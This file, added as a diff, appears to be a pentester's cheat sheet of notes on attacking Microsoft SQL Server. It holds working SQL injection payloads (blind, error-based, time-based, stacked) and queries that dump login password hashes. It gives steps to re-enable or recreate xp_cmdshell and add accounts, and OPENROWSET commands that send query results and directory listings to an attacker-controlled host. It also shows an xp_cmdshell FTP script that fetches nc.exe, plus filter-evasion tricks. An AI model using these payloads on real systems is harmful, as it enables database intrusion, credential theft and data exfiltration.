@@ -1,0 +1,231 @@
+# mssql
+
+# linux clients
+sqlquery (SQL Auditing Tools, (SQLat) http://www.vulnerabilityassessment.co.uk/sqlat.htm)
+TDSVER=7.0 tsql -S 192.168.122.23:1433 -U DOM\admin.global -P Password1 # or TDSVER=8.0
+impacket (http://pen-testing.sans.org/blog/pen-testing/2013/05/21/tds-mssql-and-python-oh-my)
+dbvis (GUI)
+sqsh (never tested, old++, and requires to configure /etc/freetds/freetds.conf)
+
+apt-get install freetds-dev
+export FREETDSCONF=${HOME}/.freetds.conf
+cat << EOF >> ~/.freetds.conf
+[target]
+  # The target IP address
+        host = x.x.x.x
+  # The target port
+        port = 1433
+  # tds version
+        tds version = 8.0
+EOF
+echo '\set semicolon_hack=on' >> ~/.sqshrc
+
+sqsh -w 256 -U sa -P '' -S 127.0.0.1 # sa/<empty>
+sqsh -w 256 -U sa -P '' -S target # uses .freetds.conf
+
+# windows clients (in Program Files)
+isql.exe –S PRDSRV1 –U sa –P Password1 –Q “SELECT name FROM master..sysdatabases”
+osql (same cmdline) (have a standalone in hsccvs)
+sqlcmd (same cmdline) supports 2008R2 features
+
+# osql usage
+osql -D BLAH -E #ODBC
+osql -Stcp:myServer,portNumber -E
+
+# getsysadmin (since mssql 2008 (2008 R2, 2012 ...) local admins are no longer members of the sysadmin role (http://msdn.microsoft.com/en-us/library/dd207004.aspx))
+* if < MS SQL 2012 then start SQL Server Management Studio as SYSTEM
+psexec -i -s SSMS.exe, or sqlwb.exe, or osql.exe -E
+
+* if >= MSSQL 2012, solution is to force sql server to put sql server in single mode (ie. this will DoS other clients) so that local admin can login and create a new sysadmin or add himself to sysadmins (http://mobydisk.com/softdev/techinfo/sqlserver.html)
+- force mixed-mode auth (not needed if you will create a new builtin sysadmin, required if you want to add local admin to sysadmins)
+HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Microsoft SQL Server\MSSQL10.MSSQLSERVER\MSSQLServer set "LoginMode" to 2
+Restart SQL Server
+- single mode & new sysadmin
+services.msc -> stop SQL Server. Make sure SQL Server Agent service is stopped
+otherwise he will take the only connection.
+Grab the SQL server command-line (right click the service - properties) (“c:\Program Files (x86)\Microsoft SQL Server\MSSQL10_50.MSSQLSERVER2008\MSSQL\Binn\sqlservr.exe” -sMSSQLSERVER2008)
+Open an administrative command prompt
+Run the command-line from step 3, but add -m -c for single-user maintenance mode command-line. ("c:\Program Files (x86)\Microsoft SQL Server\MSSQL10_50.MSSQLSERVER2008\MSSQL\Binn\sqlservr.exe" -sMSSQLSERVER2008 -m -c)
+Open another administrative command prompt.
+Run "sqlcmd -S localhost\SQLEXPRESS" from that same directory (replace with your server and instance name)
+Now you can do all the stuff everyone told you to do that didn"t work. For example, to create a hero user with administrative access:
+CREATE LOGIN hero WITH PASSWORD="123", DEFAULT_DATABASE=[master], DEFAULT_LANGUAGE=[us_english], CHECK_EXPIRATION=OFF, CHECK_POLICY=OFF
+EXEC sys.sp_addsrvrolemember @loginname = "hero", @rolename = "sysadmin"
+GO
+QUIT and close the command-prompt
+Go to the SQL Server command-line window and hit ctrl+C. It will prompt "Do you wish to shutdown SQL Server (Y/N)?" and enter Y.
+Close the command-prompt
+Restart SQL Server service and login away!
+
+# Mon install de MSSQLServer 2005 sur ma VM locale windows 2003 EN.
+Pendant l'install, j'ai selectionné :
+ - "Default instance"
+ - "Use the built-in System account" "Local system"
+ - "Windows Authentication Mode"
+Le reste des questions, j'ai laissé par defaut.
+
+# hashcat mssql
+0x0100 [a-Z0-9]{8} [a-Z0-9]{40}        [a-Z0-9]{40}
+           salt   sha1($pass.$salt)  sha1($pass.upper().$salt)
+oclhashcat-plus -m 2500
+oclhashcat-lite -m 1300
+
+# audit / pentest
+* boolean blind
+and unicode(substring((select isnull(@@version,char(32))),1,1))=77 # 'M' de Microsoft
+
+group by news.news_id having 1=1--
+
+* error based sqli
+and 1=convert(int,@@version) and 'a'='a
+and 1=convert(int,(select+top+1+column_name+from+information_schema.columns+where+table_name='users'
+
+* time
+foo=bar' waitfor delay '0:0:5'--
+
+* stacked time
+;waitfor delay '0:0:5'--
+;if(1=1) waitfor delay '0:0:5'--
+;if(unicode(substring((select version()),1,1)>51) waitfor delay '0:0:5'--
+
+* basics
+sqlcmd -L
+sqlcmd -S <server> -U sa -P <password> *
+1> USE [Database With Spaces]
+2> select Email, PasswordFormat, PasswordSalt, Password from aspnet_Membership
+3> go
+
+select @@version
+select @@servername
+select db_name()
+select user_name()
+exec master..xp_msver
+exec master..xp_loginconfig
+select name, value_in_use from sys.configurations #name collate SQL_Latin1_General_CP1_CI_AS, cast(value_in_use as int)
+select SERVERPROPERTY('MachineName') # server name
+select CONNECTIONPROPERTY('local_net_address'), CONNECTIONPROPERTY('client_net_address') # > mssql 2005, local IP and remote IP
+
+* list users
+SELECT name FROM master..syslogins
+
+* list passwords
+  < mssql 2005
+SELECT name, password FROM master..sysxlogins
+SELECT name, master.dbo.fn_varbintohexstr(password) FROM master..sysxlogins
+  >= mssql 2005
+SELECT name, password_hash FROM master.sys.sql_logins 
+SELECT name + ':' + master.sys.fn_varbintohexstr(password_hash) from master.sys.sql_logins
+
+* list sysadmins
+SELECT name FROM master..syslogins WHERE sysadmin = '1' # >= mssql 2005
+
+* list dbs
+EXEC sp_databases
+select name, filename from master..sysdatabases
+SELECT DB_NAME(N); — for N = 0, 1, 2, …
+
+SELECT table_schema+'.'+table_name FROM information_schema.tables WHERE table_catalog=''
+
+* list tables
+select name from nom_de_la_base..sysobjects where type='U'
+select table_name from nom_de_la_base.information_schema.tables
+
+* list columns
+select column_name from [database name].information_schema.columns where table_name = N'the_table'
+
+* list tables & columns
+SELECT sysobjects.name as tablename, syscolumns.name as columnname FROM ladb..sysobjects JOIN ladb..syscolumns ON sysobjects.id = syscolumns.id WHERE sysobjects.xtype = 'U' # AND syscolumns.name LIKE ‘%PASSWORD%’ — this lists table, column for each column containing the word ‘password’
+
+* get table desc
+exec sp_columns nom_table
+
+* dump table
+select top 10 * from [nom_db].[nom_schema].[nom_table] // eg. webapp.dbo.users
+
+* liste les fonctions udf
+SELECT name AS function_name, SCHEMA_NAME(schema_id) AS schema_name, type_desc FROM ladb..objects WHERE type_desc LIKE '%FUNCTION%';
+SELECT name AS function_name, SCHEMA_NAME(schema_id) AS schema_name, type_desc FROM sys.objects WHERE type_desc LIKE '%FUNCTION%';
+or
+select name, definition, type_desc FROM sys.sql_modules m INNER JOIN sys.objects o ON m.object_id=o.object_id where type_desc like '%function%'
+
+# xp_dirtree
+master.dbo.xp_dirtree to force the db server to authenticate to an SMB server
+EXEC master.sys.xp_dirtree 'D:\Backup\TRON4\TEST2\MyDb1',0,1;
+
+# xp_cmdshell
+id=1; exec xp_cmdshell 'net user own3d Password1 /add'
+
+select * from SYS.CONFIGURATIONS WHERE Name='xp_cmdshell'
+
+si xp_cmdshell a été desactivé, commandes pour le reactiver (SQL Server 2005 ou 2008):
+exec sp_configure 'show advanced options',1;reconfigure; OU reconfigure with override # si ca n'a pas marche
+exec sp_configure 'Ad Hoc Distributed Queries',1;reconfigure; # dunno what that does (c/p from blog)
+exec master.dbo.sp_configure 'xp_cmdshell',1;reconfigure; OU reconfigure with override
+
+On MSSQL 2000:
+  If you have 'sa' privileges but xp_cmdshell has been disabled/removed with sp_dropextendedproc, 
+  we can simply inject the following code:
+
+  EXEC sp_addextendedproc 'xp_anyname', 'xp_log70.dll';--
+
+  This creates a new stored procedure 'xp_anyname' linked to xp_log70.dll, which provides the xp_cmdshell functionality.
+  If the previous code does not work, it means that the xp_log70.dll has been moved or deleted. In this case we need to inject the following code:
+
+    CREATE PROCEDURE xp_cmdshell(@cmd varchar(255), @Wait int = 0) AS
+    DECLARE @result int, @OLEResult int, @RunResult int
+    DECLARE @ShellID int
+    EXECUTE @OLEResult = sp_OACreate 'WScript.Shell', @ShellID OUT
+    IF @OLEResult <> 0 SELECT @result = @OLEResult
+    IF @OLEResult <> 0 RAISERROR ('CreateObject %0X', 14, 1, @OLEResult)
+    EXECUTE @OLEResult = sp_OAMethod @ShellID, 'Run', Null, @cmd, 0, @Wait
+    IF @OLEResult <> 0 SELECT @result = @OLEResult
+    IF @OLEResult <> 0 RAISERROR ('Run %0X', 14, 1, @OLEResult)
+    EXECUTE @OLEResult = sp_OADestroy @ShellID
+    return @result
+http://xd-blog.com.ar/descargas/manuales/bugs/full-mssql-injection-pwnage.html
+
+# OPENROWSET 
+# http://codewhitesec.blogspot.com.au/2015/06/reading-and-writing-files-with-mssql-openrowset.html
+si on n'est pas sysadmin
+* first make sure openrowset is enabled with 'ad hoc distributed queries'
+select * from OpenRowSet('SQLOLEDB','Network=DBMSSOCN;Address=yespapa.d2t.attacker.com;uid=sa;pwd=','exec master..xp_msver')
+* exfiltration
+blah');INSERT INTO OPENROWSET('SQLOLEDB','<my external IP>';'sa';'1dhw753',output_db.dbo.output) SELECT @@version;--
+* read local file
+create table #output (output varchar(255) null);insert #output exec xp_cmdshell 'dir C:\'; INSERT INTO OPENROWSET('SQLOLEDB','<my external IP>';'sa';'1dhw753',output_db.dbo.output) select * from #output where output is not null; drop table #output
+* copying entire db etc.
+http://www.secforce.com/blog/2013/01/stacked-based-mssql-blind-injection-bypass-methodology/
+* can also do password guessing attack against a sysadmin to be able to xp_cmdshell
+select * from OpenRowSet('SQLOLEDB','Network=DBMSSOCN;Address=<server IP or servername>;uid=sa;pwd=','select 1337')
+
+# abusing users that have been granted impersonate permissions to switch to sa or DAs
+https://blog.netspi.com/hacking-sql-server-stored-procedures-part-2-user-impersonation/
+
+# upload file
+exec master..xp_cmdshell 'echo open ftp.tester.org > ftpscript.txt';--
+exec master..xp_cmdshell 'echo USER >> ftpscript.txt';-- 
+exec master..xp_cmdshell 'echo PASS >> ftpscript.txt';--
+exec master..xp_cmdshell 'echo bin >> ftpscript.txt';--
+exec master..xp_cmdshell 'echo get nc.exe >> ftpscript.txt';--
+exec master..xp_cmdshell 'echo quit >> ftpscript.txt';--
+exec master..xp_cmdshell 'ftp -n -s:ftpscript.txt';--
+
+# export table to file
+exec xp_cmdshell 'bcp "select * from db.dbo.tablename" queryout "c:\windows\temp\blah.txt" -c -T'
+
+# tricks
+https://www.netspi.com/blog/entryid/228/locate-and-attack-domain-sql-servers-without-scanning
+http://www.casaba.com/blog/2013/05/sql-server-now-with-reflective-dllexe-injection/
+https://www.netspi.com/blog/entryid/197/how-to-hack-database-links-in-sql-server
+https://www.netspi.com/blog/entryid/221/decrypting-mssql-database-link-server-passwords
+https://blog.netspi.com/decrypting-mssql-credential-passwords/
+
+# mitm downgrade to strip encryption
+https://gist.github.com/thinkst/db909e3a41c5cb07d43f (http://blog.thinkst.com/2015/11/stripping-encryption-from-microsoft-sql.html)
+
+# sqlmap notes
+il fallait que j'enleve le cast(@@version AS NVARCHAR(4000)) de son payload pour que ca passe
+
+# evasion
+mssql allow chars from 01-1f to be used as whitespaces
+iis+asp parameter pollution inserts , need to use /**/ like .aspx?iid='; /*&iid=1*/ EXEC /*&iid=1*/ master..xp_cmdshell /*&iid=1*/ "ping 10.1.1.3" /*&iid=1*/ -- => '; /*,1*/ EXEC /*,1*/ master..xp_cmdshell /*,1*/ "ping 10.1.1.3" /*,1*/ --
